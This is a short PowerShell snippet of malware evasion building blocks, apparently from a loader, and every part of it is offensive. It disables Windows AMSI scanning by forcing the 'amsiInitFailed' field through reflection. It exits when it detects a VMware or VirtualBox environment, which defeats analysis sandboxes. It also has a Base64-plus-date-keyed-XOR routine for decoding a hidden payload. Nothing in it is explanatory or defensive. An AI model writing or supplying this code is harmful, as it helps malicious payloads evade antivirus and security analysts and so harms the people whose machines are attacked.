# Better AMSI Bypass (obfuscated)
$a='System.Management.Automation.AmsiUtils'
$t=[Ref].Assembly.GetType($a)
$f=$t.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

# Better VM Detection
$VMChecks = @(
    (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB,
    (Get-WmiObject Win32_ComputerSystem).Manufacturer -match "VMware|VirtualBox|Microsoft Corporation",
    (Get-Process | Where-Object {$_.ProcessName -match "vmtoolsd|vmwareuser|vboxtray"}).Count -gt 0,
    (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|VirtualBox"
)
if ($VMChecks -contains $true) { exit }

# Better Obfuscation (multi-layer)
Function Multi-Decode {
    param([byte[]]$Data)
    # Layer 1: Base64
    $Data = [System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($Data))
    # Layer 2: XOR with dynamic key
    $Key = [datetime]::Now.Day + [datetime]::Now.Month
    for ($i=0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor ($Key + $i % 256)
    }
    return $Data
}
